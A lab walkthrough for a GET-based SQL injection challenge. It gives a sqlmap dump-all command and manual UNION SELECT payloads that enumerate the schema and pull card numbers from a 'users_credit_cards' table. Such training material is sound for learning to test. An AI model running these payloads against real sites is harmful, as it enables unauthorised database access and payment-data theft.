-> GET Based SQL Injection in URL Variant 3

Query:

Solution for SQLmap
	Step 1: Go to the hacking challenge (The URL will be different for each user). 	http://13.233.238.136/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/
	
	Step 2: Now open SQLmap on the command prompt( press windows+r and type cmd, then press Enter key) or terminal.
	
	Step 3: Now click on any of the ‘Departments’ given on the challenge page to gain complete URL like this: http://13.233.238.136/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1
	
	Step 4: Enter the command given below along with the complete URL
	sqlmap -u "http://13.233.238.136/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1" --dbs --dump-all

Solution for the manual approach
	Step 1: Go to the hacking challenge (The URL will be different for each user). http://13.232.78.80/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/
	
	Step2: Enter the query given below in the URL:
	http://13.232.78.80/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1) or (1)=(1
	Now press enter. It will provide information for all the departments.

	Step3: To find the vulnerable columns use the following commands:
	http://13.232.78.80/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1) order by (4
	http://13.232.78.80/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=-1) UNION SELECT (1),(2),(3),(4
	
	Step4: To find the table schema, use the following command:
	http://13.232.78.80/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=-1) UNION SELECT (1),(database()),(3),(4
	output:
	Department of Faculty:
	SQL_Injection_V5, 3
	
	Step5: Now for finding tables, copy this in the browser:
	http://13.233.164.59/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1) union select 1,database(),table_name,4 from information_schema.tables where table_schema='SQL_Injection_V5'--+
	
	Step6: To find the column names use the following command:
	http://13.232.218.95/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1) union select 1,database(),column_name,4 from information_schema.columns where table_schema='SQL_Injection_V5' and table_name='users_credit_cards'--+
	
	Step7: To extract the data use the following command:
	http://13.232.218.95/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1) union select 1,id,card_number,4 from users_credit_cards--+
